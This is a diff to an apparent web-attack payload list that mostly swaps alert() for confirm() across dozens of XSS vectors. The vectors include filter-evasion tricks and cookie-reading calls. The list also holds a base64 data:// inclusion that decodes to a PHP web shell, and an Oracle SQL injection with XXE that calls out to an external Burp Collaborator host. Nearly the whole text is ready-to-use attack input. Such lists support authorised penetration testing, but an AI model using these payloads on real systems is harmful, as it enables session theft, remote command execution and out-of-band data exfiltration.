@@ -1,60 +1,61 @@
 ``` 
-(/*%20this%20is%20a%20comment%20*/self/*%20foo%20*/)[/*bar*/"alert"/**/]("yo")
+(/*%20this%20is%20a%20comment%20*/self/*%20foo%20*/)[/*bar*/"confirm"/**/]("yo")
 self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"])
 self["\x61\x6c\x65\x72\x74"](self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])
 
-"onmouseover="alert(1)
-</script><script>alert(1)</script>
-\'-alert(1)//
-http://foo?'-alert(1)-'
-${alert(1)}
-&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+"onmouseover="confirm(1)
+</script><script>confirm(1)</script>
+\'-confirm(1)//
+http://foo?'-confirm(1)-'
+${confirm(1)}
+&'},x=x=>{throw/**/onerror=confirm,1337},toString=x,window+'',{x:'
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4pJTAw&cmd=id
-<svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
-">"><svg on"><sv">sv<svg onload=(alert)(1)>g onload=(alert)(1)>load=(alert)(1)>
-?'accesskey='x'onclick='alert(1)
-'-alert(1)-'
-"><svg><discard%20onbegin=alert(1)>
+<svg<script> onmou<script>seover</script>="confirm('xss')">hii</svg</script>>
+">"><svg on"><sv">sv<svg onload=(confirm)(1)>g onload=(confirm)(1)>load=(confirm)(1)>
+?'accesskey='x'onclick='confirm(1)
+'-confirm(1)-'
+"><svg><discard%20onbegin=confirm(1)>
 ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
-<svg><a><animate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F><text+x%3D20+y%3D20>Click%20me<%2Ftext><%2Fa>
-{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
-{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+<svg><a><animate+attributeName%3Dhref+values%3Djavascript%3Aconfirm(1)+%2F><text+x%3D20+y%3D20>Click%20me<%2Ftext><%2Fa>
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'confirm(1)')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'confirm(1)')()}}
 <script src=”<%= ResolveUrl(“~/Script.js”) %>”></script>
-/(A(%22onerror='alert%601%60'testabcd))/
-<svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
-"/><img src=xss onerror=alert(1)><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
-PL"><svg/onload=alert("XSS")><"
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+/(A(%22onerror='confirm%601%60'testabcd))/
+<svg<script> onmou<script>seover</script>="confirm('xss')">hii</svg</script>>
+"/><img src=xss onerror=confirm(1)><IMG SRC=/ onerror="confirm(String.fromCharCode(88,83,83))"></img>
+PL"><svg/onload=confirm()><"
+http://aaa#'><img onerror=confirm(location) src=.>
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:confirm('XSS');">
 <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
-<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<STYLE>li {list-style-image: url("javascript:confirm('XSS')");}</STYLE><UL><LI>XSS</br>
 ">'><details/open/ontoggle=confirm('XSS')>
-"><svg onload=(alert)(1)>
-”/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt”/>
- "><svg/onload=alert(document.domain)>
-[XSS](.alert(1);)
-sample-csv-sku.csv"-alert(document.domain)-"
-<script>alert(123);</script>
-<ScRipT>alert("XSS");</ScRipT>
-<script>alert(123)</script>
-<script>alert("hellox worldss");</script>
-<script>alert(“XSS”)</script> 
-<script>alert(“XSS”);</script>
-<script>alert(‘XSS’)</script>
-“><script>alert(“XSS”)</script>
-<script>alert(/XSS”)</script>
-<script>alert(/XSS/)</script>
-</script><script>alert(1)</script>
-‘; alert(1);
-‘)alert(1);//
-<ScRiPt>alert(1)</sCriPt>
-<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
-<IMG SRC=”javascript:alert(‘XSS’);”>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert(‘XSS’)>      
-<img src=xss onerror=alert(1)>
+"><svg onload=(confirm)(1)>
+”/>&_lt;_script>confirm(1)&_lt;/scr_ipt&gt”/>
+ "><svg/onload=confirm(document.domain)>
+[XSS](.confirm(1);)
+sample-csv-sku.csv"-confirm(document.domain)-"
+<script>confirm(123);</script>
+<ScRipT>confirm("XSS");</ScRipT>
+<script>confirm(123)</script>
+<script>confirm("hellox worldss");</script>
+<script>confirm(“XSS”)</script> 
+<script>confirm(“XSS”);</script>
+<script>confirm(‘XSS’)</script>
+“><script>confirm(“XSS”)</script>
+<script>confirm(/XSS”)</script>
+<script>confirm(/XSS/)</script>
+</script><script>confirm(1)</script>
+‘; confirm(1);
+‘)confirm(1);//
+<ScRiPt>confirm(1)</sCriPt>
+<IMG SRC=jAVasCrIPt:confirm(‘XSS’)>
+<IMG SRC=”javascript:confirm(‘XSS’);”>
+<IMG SRC=javascript:confirm(&quot;XSS&quot;)>
+<IMG SRC=javascript:confirm(‘XSS’)>      
+<img src=xss onerror=confirm(1)>
 <img/src=`` onerror=this.onerror=confirm(1) 
 <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
-<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
-<script ~~~>alert(0%0)</script ~~~>
+<style/onload=&lt;!--&#09;&gt;&#10;confirm&#10;&lpar;1&rpar;>
+<script ~~~>confirm(0%0)</script ~~~>
 '||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % waqks SYSTEM "http://pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy.burpcollab'||'orator.net/">%waqks;]>'),'/l') from dual)||' 
 ```
